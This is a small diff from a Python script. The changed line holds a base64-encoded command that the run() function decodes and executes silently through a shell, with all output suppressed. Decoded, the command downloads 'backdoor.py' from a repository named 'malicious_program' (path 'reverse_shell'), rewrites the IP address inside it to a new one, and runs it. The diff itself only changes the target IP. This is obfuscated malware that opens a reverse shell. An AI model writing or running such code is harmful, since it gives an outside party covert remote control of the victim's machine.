@@ -7,7 +7,7 @@ def decode_str(encoded_str):
   return decoded_str
 
 def run():
-  encoded_bytes = b'Y3VybCAtTyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFvLVdlbi1DaGFuZy9tYWxpY2lvdXNfcHJvZ3JhbS9tYXN0ZXIvcmV2ZXJzZV9zaGVsbC9iYWNrZG9vci5weSAmJiBzZWQgLWkgJ3MvMS4xLjEuMS8xMC4xMi4xNDMuMTgvJyBiYWNrZG9vci5weSAmJiBweXRob24gYmFja2Rvb3IucHk='
+  encoded_bytes = b'Y3VybCAtTyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWWFvLVdlbi1DaGFuZy9tYWxpY2lvdXNfcHJvZ3JhbS9tYXN0ZXIvcmV2ZXJzZV9zaGVsbC9iYWNrZG9vci5weSAmJiBzZWQgLWkgcy8xLjEuMS4xLzEwLjEyLjEyOS4yMzYvIGJhY2tkb29yLnB5ICYmIHB5dGhvbiBiYWNrZG9vci5weQo='
   command = decode_str(encoded_bytes) # base64 encode string with curl command to fetch script from repository
   subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
